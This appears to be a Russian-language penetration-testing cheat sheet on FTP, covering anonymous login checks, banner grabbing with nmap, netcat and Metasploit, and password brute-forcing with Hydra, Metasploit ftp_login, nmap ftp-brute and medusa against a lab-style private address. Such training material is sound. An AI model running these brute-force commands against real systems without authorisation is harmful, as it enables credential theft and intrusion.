# FTP — ПРОТОКОЛ ПЕРЕДАЧИ ФАЙЛОВ

## Что такое FTP

FTP (File Transfer Protocol) — протокол для передачи файлов между клиентом и сервером. Работает на портах:
- **21/tcp** — управляющий канал (команды)
- **20/tcp** — канал данных (передача файлов)

FTP может быть:
- **Анонимный** — доступ без пароля (логин: `anonymous`, пароль: любой или пустой)
- **С авторизацией** — требуется логин и пароль


# 1. РАЗВЕДКА (ENUMERATE FTP)

## Проверить анонимный доступ

```bash
ftp 10.48.181.120
# Логин: anonymous
# Пароль: [пустой] или anonymous
```

## Подключиться с указанием логина и пароля

```bash
ftp 10.48.181.120
# Логин: user
# Пароль: password
```

## Посмотреть доступные файлы

После подключения:
```bash
ls                # список файлов
cd folder         # перейти в папку
get file.txt      # скачать файл
put file.txt      # загрузить файл
bye               # выйти
```

---

# 2. СМОТРЕТЬ БАННЕР FTP

## Через `nmap`

```bash
nmap -p 21 10.48.181.120 -sV
```

Баннер будет в строке `Service Info:` или `VERSION`.

## Через `nc` (netcat)

```bash
nc 10.48.181.120 21
```

Пример вывода:
```
220 (vsFTPd 3.0.3)
```

## Через `telnet`

```bash
telnet 10.48.181.120 21
```

## Через Metasploit — модуль `ftp_version`

```bash
msfconsole
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 10.48.181.120
set THREADS 5
run
```

**Что увидишь:** баннер с версией FTP-сервера.

Пример вывода:
```
[+] 10.48.181.120:21       - 220 (vsFTPd 3.0.3)
```


# 3. БРУТФОРС FTP (САМОСТОЯТЕЛЬНО)

## Hydra

```bash
hydra -l user -P pass.txt ftp://10.48.181.120 -V -t 4
```

**Параметры:**
- `-l user` — один логин
- `-L users.txt` — список логинов
- `-P pass.txt` — список паролей
- `-V` — подробный вывод
- `-t 4` — количество потоков

## Пример с файлом логинов

```bash
hydra -L users.txt -P pass.txt ftp://10.48.181.120 -V
```

## Если FTP на нестандартном порту (например, 5554)

```bash
hydra -l user -P pass.txt ftp://10.48.181.120 -s 5554 -V
```


# 4. БРУТФОРС FTP ЧЕРЕЗ METASPLOIT

## Модуль `auxiliary/scanner/ftp/ftp_login`

```bash
msfconsole
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 10.48.181.120
set USERNAME user
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 5
run
```

**Список логинов:**
```bash
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
```


# 5. ПЕРЕЧИСЛЕНИЕ FTP (ENUMERATION)

## Через `nmap`

```bash
# Проверить, открыт ли FTP
nmap -p 21 10.48.181.120 -sV

# Скрипт для анонимного доступа
nmap -p 21 --script ftp-anon 10.48.181.120

# Скрипт для брутфорса
nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt 10.48.181.120

# Скрипт для баннера
nmap -p 21 --script banner 10.48.181.120
```

## Через `nxc` (NetExec)

```bash
nxc ftp 10.48.181.120 -u user -p pass
nxc ftp 10.48.181.120 -u user -p pass --list
```

## Через `medusa`

```bash
medusa -h 10.48.181.120 -u user -P pass.txt -M ftp -t 5
```


# 6. ПОЛЕЗНЫЕ КОМАНДЫ В FTP-КЛИЕНТЕ

| Команда | Описание |
|---------|----------|
| `ls` / `dir` | Список файлов |
| `cd folder` | Перейти в папку |
| `get file` | Скачать файл |
| `mget *.txt` | Скачать все `.txt` |
| `put file` | Загрузить файл |
| `mput *.txt` | Загрузить все `.txt` |
| `delete file` | Удалить файл |
| `mkdir folder` | Создать папку |
| `rmdir folder` | Удалить папку |
| `binary` | Включить бинарный режим |
| `ascii` | Включить текстовый режим |
| `bye` / `quit` | Выйти |
